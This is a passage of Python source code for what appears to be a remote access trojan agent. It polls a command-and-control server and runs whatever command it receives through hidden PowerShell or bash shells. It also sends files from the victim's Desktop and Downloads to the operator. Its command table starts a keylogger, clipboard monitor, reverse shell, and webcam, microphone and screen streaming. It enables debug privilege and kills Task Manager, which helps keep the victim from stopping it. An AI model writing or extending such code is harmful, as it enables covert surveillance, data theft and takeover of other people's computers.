def on_file_chunk_from_operator(data):
    """Receive a file chunk from the operator and write to disk."""
    print(f"Received file chunk: {data.get('filename', 'unknown')} at offset {data.get('offset', 0)}")
    filename = data.get('filename')
    chunk_b64 = data.get('data') or data.get('chunk')
    offset = data.get('offset', 0)
    total_size = data.get('total_size', 0)
    destination_path = data.get('destination_path') or filename
    
    print(f"Debug - filename: {filename}, destination_path: {destination_path}, total_size: {total_size}")
    
    if not filename or not chunk_b64:
        print("Invalid file chunk received.")
        return
    
    # Use a temp buffer in memory or on disk
    if not hasattr(on_file_chunk_from_operator, 'buffers'):
        on_file_chunk_from_operator.buffers = {}
    buffers = on_file_chunk_from_operator.buffers
    
    if destination_path not in buffers:
        buffers[destination_path] = {'chunks': [], 'total_size': total_size, 'filename': filename}
    
    # Remove data: prefix if present
    if ',' in chunk_b64:
        chunk_b64 = chunk_b64.split(',', 1)[1]
    
    try:
        chunk = base64.b64decode(chunk_b64)
        buffers[destination_path]['chunks'].append((offset, chunk))
        
        # Check if file is complete
        received_size = sum(len(c[1]) for c in buffers[destination_path]['chunks'])
        print(f"File {filename}: received {received_size}/{total_size} bytes")
        
        # If we have received all chunks or this is the last chunk (total_size might be 0)
        if total_size > 0 and received_size >= total_size:
            print(f"File complete: received {received_size}/{total_size} bytes")
            _save_completed_file(destination_path, buffers[destination_path])
        elif total_size == 0 and len(buffers[destination_path]['chunks']) > 0:
            # If total_size is 0, assume this is the only chunk and save immediately
            print(f"Total size is 0, saving single chunk file immediately")
            _save_completed_file(destination_path, buffers[destination_path])
            
    except Exception as e:
        print(f"Error processing chunk: {e}")

def _save_completed_file(destination_path, buffer_data):
    """Save the completed file to disk."""
    try:
        # Sort chunks by offset
        buffer_data['chunks'].sort()
        
        # Ensure directory exists
        dir_path = os.path.dirname(destination_path)
        if dir_path:
            os.makedirs(dir_path, exist_ok=True)
        
        # Write file
        with open(destination_path, 'wb') as f:
            for _, chunk in buffer_data['chunks']:
                f.write(chunk)
        
        file_size = sum(len(c[1]) for c in buffer_data['chunks'])
        print(f"File saved successfully to {destination_path} ({file_size} bytes)")
        
        # Clean up buffer
        if hasattr(on_file_chunk_from_operator, 'buffers'):
            if destination_path in on_file_chunk_from_operator.buffers:
                del on_file_chunk_from_operator.buffers[destination_path]
                
    except Exception as e:
        print(f"Error saving file {destination_path}: {e}")

@sio.on('file_upload_complete_from_operator')
def on_file_upload_complete_from_operator(data):
    filename = data.get('filename')
    destination_path = data.get('destination_path') or filename
    print(f"Upload of {filename} to {destination_path} complete.")
    
    # Force save any remaining buffered file
    if hasattr(on_file_chunk_from_operator, 'buffers'):
        if destination_path in on_file_chunk_from_operator.buffers:
            print(f"Force saving file {destination_path} from completion event")
            _save_completed_file(destination_path, on_file_chunk_from_operator.buffers[destination_path])

@sio.on('request_file_chunk_from_agent')
def on_request_file_chunk_from_agent(data):
    """Handle file download request from controller - send file in chunks."""
    print(f"File download request received: {data}")
    filename = data.get('filename')
    if not filename:
        print("Invalid file request - no filename provided")
        return
    
    # Try to find the file in common locations or use the provided path
    possible_paths = [
        filename,  # Try as-is first
        os.path.join(os.getcwd(), filename),  # Current directory
        os.path.join(os.path.expanduser("~"), filename),  # Home directory
        os.path.join(os.path.expanduser("~/Desktop"), filename),  # Desktop
        os.path.join(os.path.expanduser("~/Downloads"), filename),  # Downloads
        os.path.join("C:/", filename),  # C: root
        os.path.join("C:/Users/Public", filename),  # Public folder
    ]
    
    file_path = None
    for path in possible_paths:
        if os.path.exists(path):
            file_path = path
            print(f"Found file at: {file_path}")
            break
    
    if not file_path:
        print(f"File not found: {filename}")
        print("Searched in:")
        for path in possible_paths:
            print(f"  - {path}")
        return
    
    try:
        chunk_size = 512 * 1024  # 512KB
        total_size = os.path.getsize(file_path)
        print(f"Sending file {file_path} ({total_size} bytes) in chunks...")
        with open(file_path, 'rb') as f:
            offset = 0
            chunk_count = 0
            while True:
                chunk = f.read(chunk_size)
                if not chunk:
                    break
                chunk_b64 = 'data:application/octet-stream;base64,' + base64.b64encode(chunk).decode('utf-8')
                sio.emit('file_chunk_from_agent', {
                    'agent_id': get_or_create_agent_id(),
                    'filename': os.path.basename(file_path),  # Send just the filename
                    'chunk': chunk_b64,
                    'offset': offset,
                    'total_size': total_size
                })
                offset += len(chunk)
                chunk_count += 1
                print(f"Sent chunk {chunk_count}: {len(chunk)} bytes at offset {offset}")
        print(f"File {file_path} sent to controller in {chunk_count} chunks")
    except Exception as e:
        print(f"Error sending file {file_path}: {e}")

def handle_voice_playback(command_parts):
    """Handle voice playback from controller."""
    try:
        if len(command_parts) < 2:
            return "Invalid voice command format"
        
        audio_content_b64 = command_parts[1]
        
        # Decode base64 audio
        audio_content = base64.b64decode(audio_content_b64)
        
        # Create temporary file
        with tempfile.NamedTemporaryFile(suffix='.wav', delete=False) as temp_file:
            temp_file.write(audio_content)
            temp_audio_path = temp_file.name
        
        # Initialize pygame mixer for audio playback
        pygame.mixer.init()
        pygame.mixer.music.load(temp_audio_path)
        pygame.mixer.music.play()
        
        # Wait for playback to finish
        while pygame.mixer.music.get_busy():
            time.sleep(0.1)
        
        # Clean up
        pygame.mixer.quit()
        os.unlink(temp_audio_path)
        
        return "Voice message played successfully"
    except Exception as e:
        return f"Voice playback failed: {e}"

def handle_live_audio(command_parts):
    """Handle live audio stream from controller microphone."""
    try:
        if len(command_parts) < 2:
            return "Invalid live audio command format"
        
        audio_content_b64 = command_parts[1]
        
        # Decode base64 audio
        audio_content = base64.b64decode(audio_content_b64)
        
        # Create temporary file for processing
        with tempfile.NamedTemporaryFile(suffix='.webm', delete=False) as temp_file:
            temp_file.write(audio_content)
            temp_audio_path = temp_file.name
        
        # Process audio with speech recognition if available
        if SPEECH_RECOGNITION_AVAILABLE:
            try:
                # Convert webm to wav for speech recognition
                import subprocess
                wav_path = temp_audio_path.replace('.webm', '.wav')
                
                if WINDOWS_AVAILABLE:
                    # Use ffmpeg if available, otherwise skip conversion
                    try:
                        subprocess.run(['ffmpeg', '-i', temp_audio_path, '-acodec', 'pcm_s16le', '-ar', '16000', wav_path], 
                                     check=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
                    except:
                        # If ffmpeg not available, try direct processing
                        wav_path = temp_audio_path
                else:
                    try:
                        subprocess.run(['ffmpeg', '-i', temp_audio_path, '-acodec', 'pcm_s16le', '-ar', '16000', wav_path], 
                                     check=True, capture_output=True)
                    except:
                        wav_path = temp_audio_path
                
                # Try to recognize speech
                recognizer = sr.Recognizer()
                try:
                    with sr.AudioFile(wav_path) as source:
                        audio = recognizer.record(source)
                    command = recognizer.recognize_google(audio).lower()
                    print(f"Live audio command received: {command}")
                    
                    # Process the voice command
                    if "screenshot" in command or "screen shot" in command:
                        execute_command("screenshot")
                    elif "open camera" in command or "start camera" in command:
                        start_camera_streaming(get_or_create_agent_id())
                    elif "close camera" in command or "stop camera" in command:
                        stop_camera_streaming()
                    elif "start streaming" in command or "start stream" in command:
                        start_streaming(get_or_create_agent_id())
                    elif "stop streaming" in command or "stop stream" in command:
                        stop_streaming()
                    elif "system info" in command or "system information" in command:
                        return execute_command("systeminfo" if WINDOWS_AVAILABLE else "uname -a")
                    elif "list processes" in command or "show processes" in command:
                        if WINDOWS_AVAILABLE:
                            return execute_command("Get-Process | Select-Object Name, Id | Format-Table")
                        else:
                            return execute_command("ps aux")
                    elif "current directory" in command or "where am i" in command:
                        return execute_command("pwd")
                    elif command.startswith("run ") or command.startswith("execute "):
                        actual_command = command.split(" ", 1)[1] if " " in command else ""
                        if actual_command:
                            return execute_command(actual_command)
                    else:
                        print(f"Unknown live audio command: {command}")
                        
                except sr.UnknownValueError:
                    print("Could not understand live audio")
                except sr.RequestError as e:
                    print(f"Speech recognition error: {e}")
                    
                # Clean up wav file if created
                if wav_path != temp_audio_path and os.path.exists(wav_path):
                    os.unlink(wav_path)
                    
            except Exception as e:
                print(f"Live audio processing error: {e}")
        
        # Clean up temp file
        os.unlink(temp_audio_path)
        
        return "Live audio processed successfully"
    except Exception as e:
        return f"Live audio processing failed: {e}"

def execute_command(command):
    """Executes a command and returns its output."""
    try:
        if WINDOWS_AVAILABLE:
            # Explicitly use PowerShell to execute commands on Windows
            result = subprocess.run(
                ["powershell.exe", "-NoProfile", "-Command", command],
                capture_output=True,
                text=True,
                timeout=30,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
        else:
            # Use bash on Linux/Unix systems
            result = subprocess.run(
                ["bash", "-c", command],
                capture_output=True,
                text=True,
                timeout=30
            )
        
        output = result.stdout + result.stderr
        if not output:
            return "[No output from command]"
        return output
    except subprocess.TimeoutExpired:
        return "Command execution timed out after 30 seconds"
    except FileNotFoundError:
        if WINDOWS_AVAILABLE:
            return "PowerShell not found. Command execution failed."
        else:
            return "Bash not found. Command execution failed."
    except Exception as e:
        return f"Command execution failed: {e}"

def main_loop(agent_id):
    """The main command and control loop."""
    # Initialize high-performance systems
    low_latency_available = initialize_low_latency_input()
    
    internal_commands = {
        "start-stream": lambda: start_streaming(agent_id),
        "stop-stream": stop_streaming,
        "start-audio": lambda: start_audio_streaming(agent_id),
        "stop-audio": stop_audio_streaming,
        "start-camera": lambda: start_camera_streaming(agent_id),
        "stop-camera": stop_camera_streaming,
        "start-keylogger": lambda: start_keylogger(agent_id),
        "stop-keylogger": stop_keylogger,
        "start-clipboard": lambda: start_clipboard_monitor(agent_id),
        "stop-clipboard": stop_clipboard_monitor,
        "start-reverse-shell": lambda: start_reverse_shell(agent_id),
        "stop-reverse-shell": stop_reverse_shell,
        "start-voice-control": lambda: start_voice_control(agent_id),
        "stop-voice-control": stop_voice_control,
        "kill-taskmgr": kill_task_manager,
    }
    
    # Performance monitoring counter
    performance_check_counter = 0

    while True:
        try:
            response = requests.get(f"{SERVER_URL}/get_task/{agent_id}", timeout=10)
            task = response.json()
            command = task.get("command", "sleep")

            print(f"Received command: {command}")

            if command in internal_commands:
                try:
                    internal_commands[command]()
                    output = f"Internal command '{command}' executed successfully"
                except Exception as e:
                    output = f"Internal command '{command}' failed: {e}"
            elif command.startswith("upload-file:"):
                # Split by first two colons: upload-file:path:content
                try:
                    parts = command.split(":", 2)
                    if len(parts) >= 3:
                        output = handle_file_upload(parts)
                    else:
                        output = "Invalid upload-file command format. Expected: upload-file:path:content"
                except Exception as e:
                    output = f"File upload error: {e}"
            elif command.startswith("download-file:"):
                # Split by first colon: download-file:path
                try:
                    parts = command.split(":", 1)
                    if len(parts) >= 2:
                        output = handle_file_download(parts, agent_id)
                    else:
                        output = "Invalid download-file command format. Expected: download-file:path"
                except Exception as e:
                    output = f"File download error: {e}"
            elif command.startswith("play-voice:"):
                try:
                    parts = command.split(":", 1)
                    output = handle_voice_playback(parts)
                except Exception as e:
                    output = f"Voice playback error: {e}"
            elif command.startswith("live-audio:"):
                try:
                    parts = command.split(":", 1)
                    output = handle_live_audio(parts)
                except Exception as e:
                    output = f"Live audio error: {e}"
            elif command.startswith("terminate-process:"):
                # Handle process termination with admin privileges
                try:
                    parts = command.split(":", 1)
                    if len(parts) > 1:
                        process_target = parts[1]
                        # Try to convert to int (PID) or use as string (process name)
                        try:
                            process_target = int(process_target)
                        except ValueError:
                            pass  # Keep as string (process name)
                        output = terminate_process_with_admin(process_target, force=True)
                    else:
                        output = "Invalid terminate-process command format"
                except Exception as e:
                    output = f"Process termination error: {e}"
            elif command.startswith("{") and "remote_control" in command:
                # Handle remote control commands (JSON format)
                try:
                    import json
                    command_data = json.loads(command)
                    if command_data.get("type") == "remote_control":
                        handle_remote_control(command_data)
                        output = "Remote control command executed"
                    else:
                        output = "Invalid remote control command format"
                except json.JSONDecodeError as e:
                    output = f"Invalid JSON in remote control command: {e}"
                except Exception as e:
                    output = f"Remote control command failed: {e}"
            elif command == "sleep":
                time.sleep(1)
                output = "Slept for 1 second"
            else:
                # Execute as system command
                try:
                    output = execute_command(command)
                except Exception as e:
                    output = f"Command execution error: {e}"
            
            # Send output back to server
            try:
                response = requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output}, timeout=5)
                if response.status_code != 200:
                    print(f"Warning: Server returned status {response.status_code} when posting output")
            except requests.exceptions.RequestException as e:
                print(f"Failed to send output to server: {e}")
            
            # Performance monitoring
            performance_check_counter += 1
            if performance_check_counter >= 100:
                performance_check_counter = 0
                # Log performance stats occasionally
                if low_latency_available:
                    stats = get_input_performance_stats()
                    print(f"Performance stats: {stats}")
                    
        except requests.exceptions.RequestException as e:
            print(f"Network error in main loop: {e}")
            time.sleep(5)  # Wait before retrying
        except Exception as e:
            print(f"Error in main loop: {e}")
            time.sleep(1)  # Wait before retrying

# --- Process Termination Functions ---

def terminate_process_with_admin(process_name_or_pid, force=True):
    """Terminate a process with administrative privileges."""
    if not WINDOWS_AVAILABLE:
        return terminate_linux_process(process_name_or_pid, force)
    
    try:
        # First try to elevate if not already admin
        if not is_admin():
            print("Attempting to elevate privileges for process termination...")
            if not elevate_privileges():
                print("Could not elevate privileges. Trying alternative methods...")
                return terminate_process_alternative(process_name_or_pid, force)
        
        # Method 1: Use taskkill with admin privileges
        if isinstance(process_name_or_pid, str):
            # Process name provided
            cmd = ['taskkill', '/IM', process_name_or_pid]
        else:
            # PID provided
            cmd = ['taskkill', '/PID', str(process_name_or_pid)]
        
        if force:
            cmd.append('/F')
        
        # Add /T to terminate child processes
        cmd.append('/T')
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, 
                                  creationflags=subprocess.CREATE_NO_WINDOW if WINDOWS_AVAILABLE else 0)
            if result.returncode == 0:
                return f"Process terminated successfully: {result.stdout}"
            else:
                print(f"Taskkill failed: {result.stderr}")
                # Try alternative methods
                return terminate_process_alternative(process_name_or_pid, force)
        except Exception as e:
            print(f"Taskkill command failed: {e}")
            return terminate_process_alternative(process_name_or_pid, force)
            
    except Exception as e:
        print(f"Process termination failed: {e}")
        return f"Failed to terminate process: {e}"

def terminate_process_alternative(process_name_or_pid, force=True):
    """Alternative process termination methods using Windows API."""
    if not WINDOWS_AVAILABLE:
        return "Alternative termination not available on this platform"
    
    try:
        # Method 1: Direct Windows API termination
        if isinstance(process_name_or_pid, str):
            # Find process by name
            target_pids = []
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'].lower() == process_name_or_pid.lower():
                    target_pids.append(proc.info['pid'])
        else:
            target_pids = [process_name_or_pid]
        
        if not target_pids:
            return f"Process not found: {process_name_or_pid}"
        
        terminated_count = 0
        for pid in target_pids:
            if terminate_process_by_pid(pid, force):
                terminated_count += 1
        
        if terminated_count > 0:
            return f"Successfully terminated {terminated_count} process(es)"
        else:
            return "Failed to terminate any processes"
            
    except Exception as e:
        return f"Alternative termination failed: {e}"

def terminate_process_by_pid(pid, force=True):
    """Terminate a specific process by PID using Windows API."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Method 1: Use TerminateProcess API
        process_handle = win32api.OpenProcess(
            win32con.PROCESS_TERMINATE | win32con.PROCESS_QUERY_INFORMATION,
            False,
            pid
        )
        
        if process_handle:
            try:
                # Get process name for logging
                try:
                    process_name = win32process.GetModuleFileNameEx(process_handle, 0)
                    print(f"Terminating process: {process_name} (PID: {pid})")
                except:
                    print(f"Terminating process PID: {pid}")
                
                # Terminate the process
                win32api.TerminateProcess(process_handle, 1)
                win32api.CloseHandle(process_handle)
                
                # Wait a moment and verify termination
                time.sleep(0.5)
                try:
                    psutil.Process(pid)
                    # Process still exists, try more aggressive methods
                    return terminate_process_aggressive(pid)
                except psutil.NoSuchProcess:
                    # Process terminated successfully
                    return True
                    
            except Exception as e:
                win32api.CloseHandle(process_handle)
                print(f"TerminateProcess failed for PID {pid}: {e}")
                return terminate_process_aggressive(pid)
        else:
            print(f"Could not open process handle for PID {pid}")
            return terminate_process_aggressive(pid)
            
    except Exception as e:
        print(f"Process termination by PID failed: {e}")
        return False

def terminate_process_aggressive(pid):
    """Aggressive process termination using advanced techniques."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Method 1: Use NtTerminateProcess (more direct)
        try:
            ntdll = ctypes.windll.ntdll
            kernel32 = ctypes.windll.kernel32
            
            # Open process with maximum access
            process_handle = kernel32.OpenProcess(0x1F0FFF, False, pid)  # PROCESS_ALL_ACCESS
            if process_handle:
                # Use NtTerminateProcess for more direct termination
                status = ntdll.NtTerminateProcess(process_handle, 1)
                kernel32.CloseHandle(process_handle)
                
                if status == 0:  # STATUS_SUCCESS
                    print(f"Process {pid} terminated using NtTerminateProcess")
                    return True
        except Exception as e:
            print(f"NtTerminateProcess failed: {e}")
        
        # Method 2: Debug privilege escalation and termination
        try:
            # Enable debug privilege
            enable_debug_privilege()
            
            # Try termination again with debug privilege
            process_handle = win32api.OpenProcess(
                win32con.PROCESS_TERMINATE,
                False,
                pid
            )
            
            if process_handle:
                win32api.TerminateProcess(process_handle, 1)
                win32api.CloseHandle(process_handle)
                print(f"Process {pid} terminated with debug privilege")
                return True
                
        except Exception as e:
            print(f"Debug privilege termination failed: {e}")
        
        # Method 3: Use psutil as last resort
        try:
            proc = psutil.Process(pid)
            proc.terminate()
            proc.wait(timeout=3)
            print(f"Process {pid} terminated using psutil")
            return True
        except psutil.TimeoutExpired:
            try:
                proc.kill()
                print(f"Process {pid} killed using psutil")
                return True
            except:
                pass
        except Exception as e:
            print(f"Psutil termination failed: {e}")
        
        return False
        
    except Exception as e:
        print(f"Aggressive termination failed: {e}")
        return False

def enable_debug_privilege():
    """Enable debug privilege for the current process."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Get current process token
        token_handle = win32security.OpenProcessToken(
            win32api.GetCurrentProcess(),
            win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY
        )
        
        # Get LUID for debug privilege
        debug_privilege = win32security.LookupPrivilegeValue(None, "SeDebugPrivilege")
        
        # Enable the privilege
        privileges = [(debug_privilege, win32security.SE_PRIVILEGE_ENABLED)]
        win32security.AdjustTokenPrivileges(token_handle, False, privileges)
        
        win32api.CloseHandle(token_handle)
        print("Debug privilege enabled")
        return True
        
    except Exception as e:
        print(f"Failed to enable debug privilege: {e}")
        return False

def terminate_linux_process(process_name_or_pid, force=True):
    """Terminate process on Linux systems."""
    try:
        if isinstance(process_name_or_pid, str):
            # Use pkill for process name
            cmd = ['pkill']
            if force:
                cmd.append('-9')  # SIGKILL
            cmd.append(process_name_or_pid)
        else:
            # Use kill for PID
            cmd = ['kill']
            if force:
                cmd.append('-9')  # SIGKILL
            cmd.append(str(process_name_or_pid))
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode == 0:
            return f"Process terminated successfully"
        else:
            return f"Process termination failed: {result.stderr}"
            
    except Exception as e:
        return f"Linux process termination failed: {e}"

def kill_task_manager():
    """Specifically target and terminate Task Manager processes."""
    if not WINDOWS_AVAILABLE:
        return "Task Manager termination only available on Windows"
    
    try:
        task_manager_processes = ['taskmgr.exe', 'Taskmgr.exe', 'TASKMGR.EXE']
        results = []
        
        for process_name in task_manager_processes:
            try:
                result = terminate_process_with_admin(process_name, force=True)
                results.append(f"{process_name}: {result}")
            except Exception as e:
                results.append(f"{process_name}: Failed - {e}")
        
        # Also try to find and kill by PID
        try:
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'].lower() == 'taskmgr.exe':
                    pid = proc.info['pid']
                    result = terminate_process_with_admin(pid, force=True)
                    results.append(f"PID {pid}: {result}")
        except Exception as e:
            results.append(f"PID search failed: {e}")
        
        return "\n".join(results)
        
    except Exception as e:
        return f"Task Manager termination failed: {e}"

# OLD MAIN BLOCK - REMOVED (DUPLICATE)
# This was the old main execution block that has been replaced by the new agent_main() function

# ========================================================================================
# HIGH PERFORMANCE CAPTURE MODULE
# From: high_performance_capture.py
# ========================================================================================

#!/usr/bin/env python3
"""
High-Performance Screen Capture Module
Optimized for 60+ FPS streaming with sub-100ms latency
"""

# Platform-specific imports for high performance capture
if platform.system() == "Windows":
    try:
        import dxcam
        HAS_DXCAM = True
    except ImportError:
        HAS_DXCAM = False
else:
    HAS_DXCAM = False

try:
    from turbojpeg import TurboJPEG
    HAS_TURBOJPEG = True
except ImportError:
    HAS_TURBOJPEG = False

try:
    import lz4.frame
    HAS_LZ4 = True
except ImportError:
    HAS_LZ4 = False

try:
    import xxhash
    HAS_XXHASH = True
except ImportError:
    HAS_XXHASH = False

class HighPerformanceCapture:
    """High-performance screen capture with hardware acceleration support"""
    
    def __init__(self, target_fps: int = 60, quality: int = 85, 
                 enable_delta_compression: bool = True):
        self.target_fps = target_fps
        self.frame_time = 1.0 / target_fps
        self.quality = quality
        self.enable_delta_compression = enable_delta_compression
        
        # Initialize capture backend
        self.capture_backend = None
        self._init_capture_backend()
        
        # Initialize compression
        self.turbo_jpeg = None
        if HAS_TURBOJPEG:
            try:
                # Suppress TurboJPEG warnings
                import warnings
                with warnings.catch_warnings():
                    warnings.simplefilter("ignore")
                    self.turbo_jpeg = TurboJPEG()
                print(f"[OK] TurboJPEG initialized successfully")
            except Exception as e:
                # Don't show the detailed error message, just indicate it's not available
                print(f"[WARN] TurboJPEG not available, using fallback compression")
                self.turbo_jpeg = None
        
        # Frame management
        self.last_frame = None
        self.last_frame_hash = None
        self.frame_buffer = []
        self.buffer_size = 3  # Triple buffering
        
        # Statistics
        self.fps_counter = 0
        self.fps_start_time = time.time()
        self.actual_fps = 0
        
        self.running = False
        self.capture_thread = None
    
    def _init_capture_backend(self):
        """Initialize the best available capture backend for the platform"""
        if HAS_DXCAM and platform.system() == "Windows":
            try:
                self.capture_backend = dxcam.create(output_color="RGB")
                self.backend_type = "dxcam"
            except Exception as e:
                self._fallback_to_mss()
        else:
            self._fallback_to_mss()
    
    def _fallback_to_mss(self):
        """Fallback to MSS capture"""
        self.capture_backend = mss.mss()
        self.backend_type = "mss"
    
    def _get_backend_name(self) -> str:
        """Get the name of the current backend"""
        if hasattr(self, 'backend_type'):
            return self.backend_type.upper()
        return "Unknown"
    
    def capture_frame(self, region=None):
        """Capture a single frame with optimal performance"""
        try:
            if self.backend_type == "dxcam" and self.capture_backend:
                # DXcam capture (Windows only)
                if region:
                    frame = self.capture_backend.grab(region=region)
                else:
                    frame = self.capture_backend.grab()
                
                if frame is None:
                    return None
                    
                # DXcam returns RGB, no conversion needed
                return frame
                
            elif self.backend_type == "mss":
                # MSS capture
                if region:
                    monitor = {"left": region[0], "top": region[1], 
                              "width": region[2] - region[0], 
                              "height": region[3] - region[1]}
                else:
                    monitor = self.capture_backend.monitors[1]
                
                screenshot = self.capture_backend.grab(monitor)
                frame = np.array(screenshot)
                
                # Convert BGRA to RGB
                if frame.shape[2] == 4:
                    frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2RGB)
                elif frame.shape[2] == 3:
                    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                
                return frame
                
        except Exception as e:
            return None
        
        return None
    
    def encode_frame(self, frame, force_keyframe: bool = False):
        """Encode frame with optimal compression"""
        if frame is None:
            return None
        
        try:
            # Delta compression check
            if self.enable_delta_compression and not force_keyframe:
                if HAS_XXHASH:
                    frame_hash = xxhash.xxh64(frame.tobytes()).hexdigest()
                    if frame_hash == self.last_frame_hash:
                        # No change, return empty data or delta marker
                        return b'DELTA_UNCHANGED'
                    self.last_frame_hash = frame_hash
            
            # Resize for performance if needed
            height, width = frame.shape[:2]
            if width > 1920:
                scale = 1920 / width
                new_width = int(width * scale)
                new_height = int(height * scale)
                frame = cv2.resize(frame, (new_width, new_height), 
                                 interpolation=cv2.INTER_AREA)
            
            # Use TurboJPEG if available (faster)
            if HAS_TURBOJPEG and self.turbo_jpeg:
                # Convert RGB to BGR for TurboJPEG
                frame_bgr = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                encoded = self.turbo_jpeg.encode(frame_bgr, quality=self.quality)
            else:
                # Fallback to OpenCV
                frame_bgr = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                success, encoded = cv2.imencode('.jpg', frame_bgr, 
                    [cv2.IMWRITE_JPEG_QUALITY, self.quality,
                     cv2.IMWRITE_JPEG_OPTIMIZE, 1])
                if not success:
                    return None
                encoded = encoded.tobytes()
            
            # Optional LZ4 compression for additional bandwidth savings
            if HAS_LZ4 and len(encoded) > 1024:  # Only compress larger frames
                compressed = lz4.frame.compress(encoded, compression_level=1)
                if len(compressed) < len(encoded):
                    return b'LZ4_COMPRESSED' + compressed
            
            self.last_frame = frame.copy()
            return encoded
            
        except Exception as e:
            return None
    
    def start_capture_stream(self, callback, region=None):
        """Start continuous capture stream"""
        if self.running:
            return
        
        self.running = True
        self.capture_thread = threading.Thread(
            target=self._capture_loop, 
            args=(callback, region),
            daemon=True
        )
        self.capture_thread.start()
    
    def _capture_loop(self, callback, region):
        """Main capture loop optimized for low latency"""
        last_time = time.time()
        frame_count = 0
        
        while self.running:
            loop_start = time.time()
            
            # Capture frame
            frame = self.capture_frame(region)
            if frame is not None:
                # Encode frame
                encoded = self.encode_frame(frame)
                if encoded and encoded != b'DELTA_UNCHANGED':
                    callback(encoded)
                
                frame_count += 1
            
            # FPS calculation
            current_time = time.time()
            if current_time - self.fps_start_time >= 1.0:
                self.actual_fps = frame_count
                frame_count = 0
                self.fps_start_time = current_time
            
            # Precise timing control
            elapsed = time.time() - loop_start
            sleep_time = max(0, self.frame_time - elapsed)
            
            if sleep_time > 0:
                # Use high-precision sleep
                if sleep_time > 0.001:
                    time.sleep(sleep_time - 0.001)
                
                # Busy wait for final precision
                target_time = loop_start + self.frame_time
                while time.time() < target_time:
                    pass
    
    def stop_capture_stream(self):
        """Stop capture stream"""
        self.running = False
        if self.capture_thread:
            self.capture_thread.join(timeout=2.0)
    
    def get_stats(self) -> dict:
        """Get capture statistics"""
        return {
            "backend": self._get_backend_name(),
            "target_fps": self.target_fps,
            "actual_fps": self.actual_fps,
            "quality": self.quality,
            "delta_compression": self.enable_delta_compression,
            "turbojpeg": HAS_TURBOJPEG,
            "lz4": HAS_LZ4
        }
    
    def set_quality(self, quality: int):
        """Dynamically adjust encoding quality"""
        self.quality = max(10, min(100, quality))
    
    def set_fps(self, fps: int):
        """Dynamically adjust target FPS"""
        self.target_fps = max(10, min(120, fps))
        self.frame_time = 1.0 / self.target_fps
    
    def __del__(self):
        """Cleanup"""
        try:
            if hasattr(self, 'capture_thread') and self.capture_thread:
                self.stop_capture_stream()
            if hasattr(self, 'capture_backend') and hasattr(self, 'backend_type') and self.backend_type == "dxcam":
                try:
                    if hasattr(self.capture_backend, 'release'):
                        self.capture_backend.release()
                except:
                    pass
        except:
            pass  # Ignore cleanup errors during destruction


class AdaptiveQualityManager:
    """Manages adaptive quality based on network conditions"""
    
    def __init__(self, capture):
        self.capture = capture
        self.bandwidth_samples = []
        self.max_samples = 30
        self.last_adjustment = time.time()
        self.adjustment_interval = 2.0  # seconds
    
    def update_bandwidth(self, bytes_sent: int, time_elapsed: float):
        """Update bandwidth measurement"""
        if time_elapsed > 0:
            bandwidth = bytes_sent / time_elapsed
            self.bandwidth_samples.append(bandwidth)
            
            if len(self.bandwidth_samples) > self.max_samples:
                self.bandwidth_samples.pop(0)
            
            # Adaptive quality adjustment
            current_time = time.time()
            if current_time - self.last_adjustment > self.adjustment_interval:
                self._adjust_quality()
                self.last_adjustment = current_time
    
    def _adjust_quality(self):
        """Adjust quality based on bandwidth"""
        if len(self.bandwidth_samples) < 5:
            return
        
        avg_bandwidth = sum(self.bandwidth_samples) / len(self.bandwidth_samples)
        current_quality = self.capture.quality
        
        # Simple adaptive algorithm
        if avg_bandwidth < 500000:  # < 500KB/s
            new_quality = max(current_quality - 10, 30)
        elif avg_bandwidth > 2000000:  # > 2MB/s
            new_quality = min(current_quality + 5, 95)
        else:
            return  # No change needed
        
        if new_quality != current_quality:
            self.capture.set_quality(new_quality)

# ========================================================================================
# LOW LATENCY INPUT MODULE
# From: low_latency_input.py
# ========================================================================================

# Fast serialization
try:
    import msgpack
    HAS_MSGPACK = True
except ImportError:
    HAS_MSGPACK = False

# Performance optimizations
if PYAUTOGUI_AVAILABLE:
    pyautogui.FAILSAFE = False
    pyautogui.PAUSE = 0  # Remove delay between commands

class LowLatencyInputHandler:
    """Ultra-low latency input handling system"""
    
    def __init__(self, max_queue_size: int = 1000):
        self.max_queue_size = max_queue_size
        self.input_queue = queue.Queue(maxsize=max_queue_size)
        self.processing_thread = None
        self.running = False
        
        # Input controllers
        self.mouse_controller = mouse.Controller()
        self.keyboard_controller = keyboard.Controller()
        
        # Performance tracking
        self.input_count = 0
        self.last_input_time = time.time()
        self.processing_times = []
        
        # Input state caching for smooth movement
        self.last_mouse_pos = self.mouse_controller.position
        self.mouse_acceleration = 1.0
        self.smooth_mouse = True
    
    def start(self):
        """Start the input processing thread"""
        if self.running:
            return
        
        self.running = True
        self.processing_thread = threading.Thread(
            target=self._process_input_loop,
            daemon=True
        )
        self.processing_thread.start()
    
    def stop(self):
        """Stop input processing"""
        self.running = False
        if self.processing_thread:
            self.processing_thread.join(timeout=1.0)
    
    def handle_input(self, input_data) -> bool:
        """Queue input for processing"""
        try:
            if self.input_queue.full():
                # Drop oldest input if queue is full (prefer latest)
                try:
                    self.input_queue.get_nowait()
                except queue.Empty:
                    pass
            
            # Add timestamp for latency measurement
            input_data['timestamp'] = time.time()
            self.input_queue.put_nowait(input_data)
            return True
            
        except queue.Full:
            return False
    
    def _process_input_loop(self):
        """Main input processing loop"""
        while self.running:
            try:
                # Get input with timeout
                input_data = self.input_queue.get(timeout=0.1)
                
                # Measure processing latency
                process_start = time.time()
                received_time = input_data.get('timestamp', process_start)
                
                # Process the input
                self._execute_input(input_data)
                
                # Track performance
                process_time = time.time() - process_start
                total_latency = time.time() - received_time
                
                self._update_performance_stats(process_time, total_latency)
